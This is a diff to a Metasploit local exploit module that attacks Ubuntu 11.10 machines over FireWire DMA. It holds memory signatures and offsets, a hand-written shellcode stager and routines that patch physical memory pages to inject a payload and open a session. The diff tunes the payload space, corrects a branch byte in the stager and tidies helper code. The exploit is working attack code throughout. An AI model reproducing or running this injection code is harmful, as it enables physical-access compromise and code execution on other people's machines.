@@ -29,9 +29,7 @@ class Metasploit3 < Msf::Exploit::Local
 			'Targets'	=>
 				[
 					[ 'Ubuntu 11.10', { 'Offset' => 0x590, 'Signature' =>
-                       # "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24\x70\x73\x05\x08\xe8\x3e\x53\xff\xff\x83\xc4\x24\x31\xc0\x5b\x5e", 'Space' => 75 } ],
-                        "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24", 'Space' => 75 } ],
-					# [ 'Ubuntu 11.10', { 'Offset' => 0x4f2, 'Signature' => "8B430C8B501C895424048B40", 'Space' => 75 } ],
+                        "\x74\x1e\x89\x5c\x24\x04\xc7\x04\x24", 'Space' => 2048 } ],
 				],
 			'DefaultTarget'	=> 0,
         	'DisclosureDate' => 'Long long ago', 
@@ -66,18 +64,16 @@ class Metasploit3 < Msf::Exploit::Local
         d = initialize_fw(b)
          
         ##
-        # Stage 1 of the attack
+        # Stage 1: find memory to patch and insert the stager
         ##
         puts 'Starting attack...'
         oldmem = patchPage(d,sig,stagerpatch,off)
 
         ##
-        # Stage 2 of the attack
+        # Stage 2: insert second stager and payload and replace old memory
         ##
-        page = "\x31\xc0\x40\x40\xcd\x80\x85\xc0" +
-               "\x75\x0c\x61\x83\x2c\x24\x05\x83" +
-               "\xc4\x04\xff\x64\x24\xfc"
-        stagesig = "\xff\xe0"  
+        page = "\x31\xc0\x40\x40\xcd\x80\x85\xc0\x74\x0c\x61\x83\x2c\x24\x05\x83\xc4\x04\xff\x64\x24\xfc"
+        stagesig = "\xff\xe0"
         patch = page + payload.encoded
 
         # Wait for user input
@@ -90,7 +86,7 @@ class Metasploit3 < Msf::Exploit::Local
         patchPage(d, stagesig,patch, 0)
 
         ##
-        # Stage 3
+        # Stage 3: wait for the session to be created
         ##
 		print_status "Starting the payload handler..."
 		while(!session_created?)
@@ -113,16 +109,15 @@ class Metasploit3 < Msf::Exploit::Local
         rescue 
             puts 'Interrupted'
         end 
+        puts ''
 
         # Open the first device
         d = b.devices
         raise 'nothing connected' if d.length <= 0
 
-        d = d[0]
-        d.open()
-        puts ''
+        d[0].open()
 
-        return d
+        return d[0]
     end 
 
     # Tries to find signature on a page at offset at device d 
@@ -139,7 +134,7 @@ class Metasploit3 < Msf::Exploit::Local
             d.write(addr, patch)
             puts 'Patch NOT confirmed!' if d.read(addr, patch.length) != patch
 
-            return [ addr,oldmem]
+            return [addr,oldmem]
         rescue IOError => e
             fail( e.message + ' Make sure FireWire interfaces are properly connected.' )
         end
@@ -157,12 +152,6 @@ class Metasploit3 < Msf::Exploit::Local
 
     def fail(msg) # This is abort()
         puts "\n [!] Attack unsuccessful. " + msg
-    end
-
-    def hex2bin(s)
-        raise "Not a valid hex string" unless(s =~ /^[\da-fA-F]+$/)
-        s = '0' + s if((s.length & 1) != 0)
-        return s.scan(/../).map{ |b| b.to_i(16) }.pack('C*')
     end
 
     def bin2hex(s)
